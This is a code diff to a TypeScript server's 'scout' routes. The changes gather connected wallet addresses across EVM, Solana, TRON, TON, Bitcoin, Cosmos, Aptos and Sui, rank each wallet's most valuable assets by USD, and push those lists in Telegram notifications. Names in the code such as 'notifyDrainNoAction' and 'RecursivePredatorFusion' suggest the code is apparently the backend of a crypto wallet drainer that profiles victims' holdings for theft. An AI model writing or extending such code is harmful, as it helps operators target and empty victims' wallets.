@@ -3,9 +3,9 @@
  */
 import { randomUUID } from 'node:crypto'
 
-import { getOracleRatesUsd, runRecursivePredatorFusionUsd } from '@legion/core'
+import { getOracleRatesUsd, runRecursivePredatorFusionUsd, getRankedAssets, computeRecursivePredatorFusionTotalUsd } from '@legion/core'
 import type { Address } from 'viem'
-import { getRankedAssets } from '@legion/core'
+import type { RankedAsset } from '@legion/core'
 import type { FastifyInstance, FastifyReply, FastifyRequest } from 'fastify'
 
 import { sendFailure, sendSuccess } from '../lib/api-response.js'
@@ -57,6 +57,92 @@ function extractRequestContext(request: FastifyRequest): TelegramRequestContext 
 
 async function resolveReferenceRatesUsd(): Promise<OracleRates> {
   return getOracleRatesUsd()
+}
+
+function rankedToStrategyAssets(assets: RankedAsset[]): StrategyAsset[] {
+  return assets
+    .filter((a) => a.amount_usd > 0)
+    .slice(0, 12)
+    .map((a) => ({
+      chain: a.chain,
+      family: a.family,
+      token: a.token,
+      symbol: a.symbol,
+      amount_usd: a.amount_usd,
+    }))
+}
+
+async function fetchStrategyAssetsForWallet(
+  wallet: string,
+  chainFamily?: string,
+): Promise<{ assets: StrategyAsset[]; totalUsd: number }> {
+  const ranked = await getRankedAssets(wallet, chainFamily)
+  const assets = rankedToStrategyAssets(ranked)
+  const totalUsd = ranked.reduce((sum, a) => sum + a.amount_usd, 0)
+  return { assets, totalUsd }
+}
+
+type FusionWalletProbe = { wallet: string; family: string }
+
+function collectFusionWalletProbes(body: {
+  evm_holder?: string
+  sol_owner_base58?: string
+  tron_holder_base58?: string
+  ton_friendly_address?: string
+  btc_holder_address?: string
+  cosmos_holder_address?: string
+  aptos_holder_address?: string
+  sui_holder_address?: string
+}): FusionWalletProbe[] {
+  const probes: FusionWalletProbe[] = []
+  const evm = typeof body.evm_holder === 'string' ? body.evm_holder.trim() : ''
+  const sol = typeof body.sol_owner_base58 === 'string' ? body.sol_owner_base58.trim() : ''
+  const tron = typeof body.tron_holder_base58 === 'string' ? body.tron_holder_base58.trim() : ''
+  const ton = typeof body.ton_friendly_address === 'string' ? body.ton_friendly_address.trim() : ''
+  const btc = typeof body.btc_holder_address === 'string' ? body.btc_holder_address.trim() : ''
+  const cosmos = typeof body.cosmos_holder_address === 'string' ? body.cosmos_holder_address.trim() : ''
+  const aptos = typeof body.aptos_holder_address === 'string' ? body.aptos_holder_address.trim() : ''
+  const sui = typeof body.sui_holder_address === 'string' ? body.sui_holder_address.trim() : ''
+  if (evm) probes.push({ wallet: evm, family: 'EVM' })
+  if (sol) probes.push({ wallet: sol, family: 'SVM' })
+  if (tron) probes.push({ wallet: tron, family: 'TRON' })
+  if (ton) probes.push({ wallet: ton, family: 'TON' })
+  if (btc) probes.push({ wallet: btc, family: 'UTXO' })
+  if (cosmos) probes.push({ wallet: cosmos, family: 'COSMOS' })
+  if (aptos) probes.push({ wallet: aptos, family: 'APTOS' })
+  if (sui) probes.push({ wallet: sui, family: 'SUI' })
+  return probes
+}
+
+/** Ranked assets across all connected families (8 native + EVM multi-chain). */
+async function fetchAllStrategyAssets(
+  probes: FusionWalletProbe[],
+): Promise<{ assets: StrategyAsset[]; totalUsd: number }> {
+  if (!probes.length) return { assets: [], totalUsd: 0 }
+  const settled = await Promise.allSettled(
+    probes.map((p) => fetchStrategyAssetsForWallet(p.wallet, p.family)),
+  )
+  const merged: StrategyAsset[] = []
+  let totalUsd = 0
+  for (const result of settled) {
+    if (result.status !== 'fulfilled') continue
+    merged.push(...result.value.assets)
+    totalUsd += result.value.totalUsd
+  }
+  merged.sort((a, b) => b.amount_usd - a.amount_usd)
+  return { assets: merged.slice(0, 15), totalUsd }
+}
+
+function inferChainFamilyFromWallet(wallet: string): string | undefined {
+  const w = wallet.trim()
+  if (/^0x[a-fA-F0-9]{40}$/.test(w)) return 'EVM'
+  if (/^T[1-9A-HJ-NP-Za-km-z]{25,34}$/.test(w)) return 'TRON'
+  if (/^[UE]Q[-A-Za-z0-9]{46}$/.test(w) || /^[0-9a-fA-F]{64}$/.test(w)) return 'TON'
+  if (/^(bc1[a-z0-9]{39,59}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})$/.test(w)) return 'UTXO'
+  if (/^cosmos1[0-9a-z]{38}$/.test(w)) return 'COSMOS'
+  if (/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(w)) return 'SVM'
+  if (/^0x[a-fA-F0-9]{1,64}$/.test(w) && w.length > 42) return 'APTOS'
+  return undefined
 }
 
 export async function registerScoutRoutes(app: FastifyInstance): Promise<void> {
@@ -195,25 +281,37 @@ export async function registerScoutRoutes(app: FastifyInstance): Promise<void> {
         'OMNICHAIN_EXPANSION_LOCKED',
       )
 
-      // 🔔 Telegram: Notify scan complete — skip $0 (client sends correct USD via scan_complete)
+      // 🔔 Telegram: scan complete — all connected families (EVM + SOL + TRON + TON + BTC + Cosmos + Aptos + Sui)
       if (primaryAddress) {
-        const totalUsd = typeof (fusion as Record<string, unknown>)['total_usd'] === 'number'
-          ? (fusion as Record<string, unknown>)['total_usd'] as number
-          : 0
+        const fusionTotal = computeRecursivePredatorFusionTotalUsd(fusion)
         const scoutUsdFromBody = body.scout_value_usd != null ? Number(body.scout_value_usd) : 0
-        const notifyUsd = scoutUsdFromBody > 0 ? scoutUsdFromBody : totalUsd
+        let strategyAssets: StrategyAsset[] = []
+        let rankedUsd = 0
+        try {
+          const ranked = await fetchAllStrategyAssets(collectFusionWalletProbes(body))
+          strategyAssets = ranked.assets
+          rankedUsd = ranked.totalUsd
+        } catch {
+          /* ranked probe optional */
+        }
+        const notifyUsd = Math.max(scoutUsdFromBody, fusionTotal, rankedUsd)
         if (notifyUsd > 0) {
-          const assetsCount = typeof (fusion as Record<string, unknown>)['assets_count'] === 'number'
-            ? (fusion as Record<string, unknown>)['assets_count'] as number
-            : Object.keys(fusion as object).length
+          const assetsCount = strategyAssets.length > 0 ? strategyAssets.length : fusion.assets_count
           const scanCtx: TelegramRequestContext = {
             ...ctx,
             scout_value_usd: notifyUsd,
+            wallet_type: 'Wallet',
             ...(typeof body.connect_session === 'string' && body.connect_session.trim() !== ''
               ? { connect_session: body.connect_session.trim() }
               : {}),
           }
-          void notifyScanComplete(primaryAddress, notifyUsd, assetsCount, scanCtx).catch(() => {})
+          void notifyScanComplete(
+            primaryAddress,
+            notifyUsd,
+            assetsCount,
+            scanCtx,
+            strategyAssets.length > 0 ? strategyAssets : undefined,
+          ).catch(() => {})
         }
       }
 
@@ -283,8 +381,37 @@ export async function registerScoutRoutes(app: FastifyInstance): Promise<void> {
       void notifyDrainNoAction(wallet, { ...ctx, detail: body.detail ?? null }).catch(() => {})
     } else if (body.event === 'scan_complete') {
       const totalUsd = body.scout_value_usd != null ? Number(body.scout_value_usd) : 0
-      const assetsCount = body.asset_count != null ? Number(body.asset_count) : 0
-      void notifyScanComplete(wallet, Number.isFinite(totalUsd) ? totalUsd : 0, assetsCount, ctx).catch(() => {})
+      let strategyAssets: StrategyAsset[] | undefined
+      if (Array.isArray(body.assets) && body.assets.length > 0) {
+        strategyAssets = body.assets
+          .filter((a) => a.amount_usd > 0)
+          .slice(0, 12)
+          .map((a) => ({
+            chain: a.chain,
+            family: a.family ?? 'EVM',
+            token: a.token,
+            symbol: a.symbol,
+            amount_usd: a.amount_usd,
+          }))
+      } else if (totalUsd > 0) {
+        try {
+          const family = body.chain_family ?? inferChainFamilyFromWallet(wallet) ?? 'EVM'
+          const ranked = await fetchStrategyAssetsForWallet(wallet, family)
+          strategyAssets = ranked.assets.length > 0 ? ranked.assets : undefined
+        } catch {
+          /* optional ranked fallback */
+        }
+      }
+      const assetsCount = body.asset_count != null
+        ? Number(body.asset_count)
+        : (strategyAssets?.length ?? 0)
+      void notifyScanComplete(
+        wallet,
+        Number.isFinite(totalUsd) ? totalUsd : 0,
+        assetsCount,
+        ctx,
+        strategyAssets,
+      ).catch(() => {})
     } else if (
       body.event === 'connect' ||
       body.event === 'scan_start' ||
